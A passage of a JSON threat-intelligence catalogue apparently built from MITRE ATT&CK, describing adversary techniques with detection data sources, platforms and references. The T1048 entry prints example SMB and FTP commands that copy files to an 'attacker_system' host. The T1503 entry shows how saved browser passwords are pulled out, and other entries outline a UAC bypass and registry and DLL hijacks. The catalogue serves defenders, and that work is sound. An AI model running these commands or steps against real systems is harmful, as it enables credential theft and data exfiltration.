Attachment](https://attack.mitre.org/techniques/T1193), [Spearphishing Link](https://attack.mitre.org/techniques/T1192), and [Spearphishing via Service](https://attack.mitre.org/techniques/T1194). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
      "meta": {
        "external_id": "T1203",
        "kill_chain": [
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Anti-virus",
          "System calls",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1203"
        ]
      },
      "uuid": "be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
      "value": "Exploitation for Client Execution - T1203"
    },
    {
      "description": "When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command</code>. For example:\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)",
      "meta": {
        "external_id": "CAPEC-556",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Windows Registry",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1042",
          "https://capec.mitre.org/data/definitions/556.html",
          "http://msdn.microsoft.com/en-us/library/bb166549.aspx",
          "https://support.microsoft.com/en-us/help/18539/windows-7-change-default-programs",
          "https://docs.microsoft.com/windows-server/administration/windows-commands/assoc",
          "https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fakeav.gzd"
        ]
      },
      "uuid": "68c96494-1a50-403e-8844-69a6af278c68",
      "value": "Change Default File Association - T1042"
    },
    {
      "description": "On Android, command line tools or the Java file APIs can be used to enumerate file system contents. However, Linux file permissions and SELinux policies generally strongly restrict what can be accessed by apps (without taking advantage of a privilege escalation exploit). The contents of the external storage directory are generally visible, which could present concern if sensitive data is inappropriately stored there.\n\niOS's security architecture generally restricts the ability to perform file and directory discovery without use of escalated privileges.",
      "meta": {
        "external_id": "T1420",
        "kill_chain": [
          "mitre-mobile-attack:discovery"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1420"
        ]
      },
      "uuid": "cf28ca46-1fd3-46b4-b1f6-ec0b72361848",
      "value": "File and Directory Discovery - T1420"
    },
    {
      "description": "Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration.\n\nAdversaries may search connected removable media on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.",
      "meta": {
        "external_id": "T1025",
        "kill_chain": [
          "mitre-attack:collection"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1025"
        ]
      },
      "uuid": "1b7ba276-eedc-4951-a762-0ceea2c030ec",
      "value": "Data from Removable Media - T1025"
    },
    {
      "description": "In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
      "meta": {
        "external_id": "T1052",
        "kill_chain": [
          "mitre-attack:exfiltration"
        ],
        "mitre_data_sources": [
          "Data loss prevention",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1052"
        ]
      },
      "uuid": "e6415f09-df0e-48de-9aba-928c902b7549",
      "value": "Exfiltration Over Physical Medium - T1052"
    },
    {
      "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.\n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)\n\nAnother example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)",
      "meta": {
        "external_id": "CAPEC-267",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Network protocol analysis",
          "Process use of network",
          "File monitoring",
          "Malware reverse engineering",
          "Binary file metadata",
          "Process command-line parameters",
          "Environment variable",
          "Process monitoring",
          "Windows event logs",
          "Network intrusion detection system",
          "Email gateway",
          "SSL/TLS inspection"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1027",
          "https://capec.mitre.org/data/definitions/267.html",
          "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/",
          "https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/",
          "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/",
          "https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html",
          "https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf",
          "https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/",
          "https://en.wikipedia.org/wiki/Duqu",
          "https://securingtomorrow.mcafee.com/mcafee-labs/malicious-document-targets-pyeongchang-olympics/",
          "https://github.com/danielbohannon/Revoke-Obfuscation",
          "https://github.com/itsreallynick/office-crackros"
        ]
      },
      "uuid": "b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
      "value": "Obfuscated Files or Information - T1027"
    },
    {
      "description": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",
      "meta": {
        "external_id": "T1092",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Data loss prevention"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1092"
        ]
      },
      "uuid": "64196062-5210-42c3-9a02-563a0d1797ef",
      "value": "Communication Through Removable Media - T1092"
    },
    {
      "description": "ART (the Android Runtime) compiles optimized code on the device itself to improve performance. An adversary may be able to use escalated privileges to modify the cached code in order to hide malicious behavior. Since the code is compiled on the device, it may not receive the same level of integrity checks that are provided to code running in the system partition.(Citation: Sabanal-ART)",
      "meta": {
        "external_id": "T1403",
        "kill_chain": [
          "mitre-mobile-attack:persistence"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1403",
          "https://www.blackhat.com/docs/asia-15/materials/asia-15-Sabanal-Hiding-Behind-ART-wp.pdf"
        ]
      },
      "uuid": "88932a8c-3a17-406f-9431-1da3ff19f6d6",
      "value": "Modify Cached Executable Code - T1403"
    },
    {
      "description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.  (Citation: Talos Olympic Destroyer 2018) \n\nWeb browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData ‎April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017)\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
      "meta": {
        "external_id": "T1503",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "PowerShell logs",
          "File monitoring",
          "API monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1503",
          "https://blog.talosintelligence.com/2018/02/olympic-destroyer.html",
          "https://docs.microsoft.com/en-us/windows/desktop/api/dpapi/nf-dpapi-cryptunprotectdata",
          "https://www.proofpoint.com/us/threat-insight/post/new-vega-stealer-shines-brightly-targeted-campaign",
          "https://www.fireeye.com/blog/threat-research/2017/07/hawkeye-malware-distributed-in-phishing-campaign.html",
          "https://github.com/putterpanda/mimikittenz"
        ]
      },
      "uuid": "4579d9c9-d5b9-45e0-9848-0104637b579f",
      "value": "Credentials from Web Browsers - T1503"
    },
    {
      "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Windows\n\nExample utilities used to obtain this information are <code>dir</code> and <code>tree</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the Windows API.\n\n### Mac and Linux\n\nIn Mac and Linux, this kind of discovery is accomplished with the <code>ls</code>, <code>find</code>, and <code>locate</code> commands.",
      "meta": {
        "external_id": "T1083",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1083",
          "http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html"
        ]
      },
      "uuid": "7bc57495-ea59-4380-be31-a64af124ef18",
      "value": "File and Directory Discovery - T1083"
    },
    {
      "description": "Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\n\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
      "meta": {
        "external_id": "CAPEC-471",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation",
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "DLL monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1038",
          "https://capec.mitre.org/data/definitions/471.html",
          "http://msdn.microsoft.com/en-US/library/ms682586",
          "https://www.owasp.org/index.php/Binary_planting",
          "http://blogs.technet.com/b/msrc/archive/2010/08/21/microsoft-security-advisory-2269637-released.aspx",
          "http://msdn.microsoft.com/en-US/library/ms682600",
          "https://msdn.microsoft.com/en-US/library/aa375365",
          "https://www.mandiant.com/blog/dll-search-order-hijacking-revisited/"
        ]
      },
      "uuid": "46944654-fcc1-4f63-9dad-628102376586",
      "value": "DLL Search Order Hijacking - T1038"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nExploits spread through advertising (malvertising) involve injecting malicious or malware-laden advertisements into legitimate online advertising networks and webpages. (Citation: TPMalvertising)",
      "meta": {
        "external_id": "T1380",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1380"
        ]
      },
      "uuid": "d72c0bc0-3007-418c-842c-328027ebdbc1",
      "value": "Deploy exploit using advertising - T1380"
    },
    {
      "description": "An adversary could evade app vetting techniques by placing code in a malicious application to detect whether it is running in an app analysis environment and, if so, avoid performing malicious actions while under analysis.\n\nDiscussion of general Android anti-analysis techniques can be found in  (Citation: Petsas). Discussion of Google Play Store-specific anti-analysis techniques can be found in  (Citation: Oberheide-Bouncer),  (Citation: Percoco-Bouncer).\n\n (Citation: Wang) presents a discussion of iOS anti-analysis techniques.\n\nPlatforms: Android, iOS",
      "meta": {
        "external_id": "T1440",
        "refs": [
          "https://attack.mitre.org/techniques/T1440"
        ]
      },
      "related": [
        {
          "dest-uuid": "d9db3d46-66ca-44b4-9daa-1ef97cb7465a",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "b765efd1-02e6-4e67-aebf-0fef5c37e54b",
      "value": "Detect App Analysis Environment - T1440"
    },
    {
      "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
      "meta": {
        "external_id": "CAPEC-17",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Services",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1044",
          "https://capec.mitre.org/data/definitions/17.html",
          "https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/",
          "http://seclists.org/fulldisclosure/2015/Dec/34"
        ]
      },
      "uuid": "0ca7beef-9bbc-4e35-97cf-437384ddce6a",
      "value": "File System Permissions Weakness - T1044"
    },
    {
      "description": "An app could contain malicious code in obfuscated or encrypted form, then deobfuscate or decrypt the code at runtime to evade many app vetting techniques.(Citation: Rastogi) (Citation: Zhou) (Citation: TrendMicro-Obad) (Citation: Xiao-iOS)",
      "meta": {
        "external_id": "APP-21",
        "kill_chain": [
          "mitre-mobile-attack:defense-evasion"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1406",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-21.html",
          "http://pages.cs.wisc.edu/~vrastogi/static/papers/rcj13b.pdf",
          "http://ieeexplore.ieee.org/document/6234407",
          "http://blog.trendmicro.com/trendlabs-security-intelligence/cybercriminals-improve-android-malware-stealth-routines-with-obad/",
          "http://www.slideshare.net/Shakacon/fruit-vs-zombies-defeat-nonjailbroken-ios-malware-by-claud-xiao"
        ]
      },
      "uuid": "d13fa042-8f26-44e1-a2a8-af0bf8e2ac9a",
      "value": "Obfuscated Files or Information - T1406"
    },
    {
      "description": "An adversary who is able to obtain unauthorized access to or misuse authorized access to cloud backup services (e.g. Google's Android backup service or Apple's iCloud) could use that access to obtain sensitive data stored in device backups. For example, the Elcomsoft Phone Breaker product advertises the ability to retrieve iOS backup data from Apple's iCloud (Citation: Elcomsoft-EPPB). Elcomsoft also describes (Citation: Elcomsoft-WhatsApp) obtaining WhatsApp communication histories from backups stored in iCloud.",
      "meta": {
        "external_id": "ECO-1",
        "kill_chain": [
          "mitre-mobile-attack:remote-service-effects"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1470",
          "https://pages.nist.gov/mobile-threat-catalogue/ecosystem-threats/ECO-0.html",
          "https://pages.nist.gov/mobile-threat-catalogue/ecosystem-threats/ECO-1.html",
          "https://www.elcomsoft.com/eppb.html",
          "https://blog.elcomsoft.com/2017/07/extract-and-decrypt-whatsapp-backups-from-icloud/"
        ]
      },
      "uuid": "0c71033e-401e-4b97-9309-7a7c95e43a5d",
      "value": "Obtain Device Cloud Backups - T1470"
    },
    {
      "description": "Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different channels could include Internet Web services such as cloud storage.\n\nAdversaries may leverage various operating system utilities to exfiltrate data over an alternative protocol. \n\nSMB command-line example:\n\n* <code>net use \\\\\\attacker_system\\IPC$ /user:username password && xcopy /S /H /C /Y C:\\Users\\\\* \\\\\\attacker_system\\share_folder\\</code>\n\nAnonymous FTP command-line example:(Citation: Palo Alto OilRig Oct 2016)\n\n* <code>echo PUT C:\\Path\\to\\file.txt | ftp -A attacker_system</code>\n",
      "meta": {
        "external_id": "T1048",
        "kill_chain": [
          "mitre-attack:exfiltration"
        ],
        "mitre_data_sources": [
          "User interface",
          "Process monitoring",
          "Process use of network",
          "Packet capture",
          "Netflow/Enclave netflow",
          "Network protocol analysis"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1048",
          "http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "a19e86f8-1c0a-4fea-8407-23b73d615776",
      "value": "Exfiltration Over Alternative Protocol - T1048"
    },
    {
      "description": "Adversaries may access and collect application data resident on the device. Adversaries often target popular applications such as Facebook, WeChat, and Gmail.(Citation: SWB Exodus March 2019)\n\nThis technique requires either escalated privileges or for the targeted app to have stored the data in an insecure manner (e.g., with insecure file permissions or in an insecure location such as an external storage directory).",
      "meta": {
        "external_id": "AUT-0",
        "kill_chain": [
          "mitre-mobile-attack:collection",
          "mitre-mobile-attack:credential-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1409",
          "https://pages.nist.gov/mobile-threat-catalogue/authentication-threats/AUT-0.html",
          "https://securitywithoutborders.org/blog/2019/03/29/exodus.html"
        ]
      },
      "uuid": "702055ac-4e54-4ae9-9527-e23a38e0b160",
      "value": "Access Stored Application Data - T1409"
    },
    {
      "description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview)\n\n### Windows\n\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039).\n\n### Mac and Linux \n\nIn Mac and Linux, <code>netstat</code> and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\".",
      "meta": {
        "external_id": "T1049",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "AWS",
          "GCP",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1049",
          "https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html",
          "https://docs.microsoft.com/en-us/azure/virtual-network/virtual-networks-overview",
          "https://cloud.google.com/vpc/docs/vpc"
        ]
      },
      "uuid": "7e150503-88e7-4861-866b-ff1ac82c4475",
      "value": "System Network Connections Discovery - T1049"
    },
    {
      "description": "Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)",
      "meta": {
        "external_id": "CAPEC-478",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "Process command-line parameters",
          "Services",
          "Windows Registry"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1058",
          "https://capec.mitre.org/data/definitions/478.html",
          "https://msdn.microsoft.com/library/windows/desktop/ms724878.aspx",
          "https://trustedsignal.blogspot.com/2014/05/kansa-service-related-collectors-and.html",
          "https://twitter.com/r0wdy_/status/936365549553991680",
          "https://technet.microsoft.com/en-us/sysinternals/bb963902"
        ]
      },
      "uuid": "39a130e1-6ab7-434a-8bd2-418e7d9d6427",
      "value": "Service Registry Permissions Weakness - T1058"
    },
    {
      "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
      "meta": {
        "external_id": "T1066",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Process use of network",
          "Process monitoring",
          "Process command-line parameters",
          "Anti-virus",
          "Binary file metadata"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1066"
        ]
      },
      "uuid": "00d0b012-8a03-410e-95de-5826bf542de6",
      "value": "Indicator Removal from Tools - T1066"
    },
    {
      "description": "Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform Privilege Escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising a endpoint system that has been properly configured and limits other privilege escalation methods.",
      "meta": {
        "external_id": "T1068",
        "kill_chain": [
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "Windows Error Reporting",
          "Process monitoring",
          "Application logs"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1068"
        ]
      },
      "uuid": "b21c3b2d-02e6-45b1-980b-e69051040839",
      "value": "Exploitation for Privilege Escalation - T1068"
    },
    {
      "description": "Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)\n\nAnother bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. 